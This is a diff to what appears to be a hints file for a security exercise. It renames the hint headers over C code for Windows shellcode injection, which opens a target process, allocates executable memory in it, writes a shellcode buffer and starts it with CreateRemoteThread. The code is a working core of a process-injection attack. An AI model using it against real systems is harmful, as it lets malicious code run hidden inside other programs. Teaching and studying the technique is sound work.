@@ -1,24 +1,24 @@
-=== HINT 1: OpenProcess ===
+=== HINT 1 ===
 proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 if (!proc) { perror("OpenProcess"); return 1; }
 
-=== HINT 2: VirtualAllocEx ===
+=== HINT 2 ===
 remote_mem = VirtualAllocEx(proc, NULL, sc_len,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
 if (!remote_mem) { CloseHandle(proc); return 1; }
 
-=== HINT 3: WriteProcessMemory ===
+
 SIZE_T written;
 if (!WriteProcessMemory(proc, remote_mem, sc, sc_len, &written))
     goto cleanup;
 
-=== HINT 4: CreateRemoteThread ===
+
 thr = CreateRemoteThread(proc, NULL, 0,
       (LPTHREAD_START_ROUTINE)remote_mem, NULL, 0, NULL);
 if (!thr) goto cleanup;
 
-=== HINT 5: Wait and cleanup ===
+=== HINT 3 (SPOILER) ===
 WaitForSingleObject(thr, 3000);
 ret = 0;
 
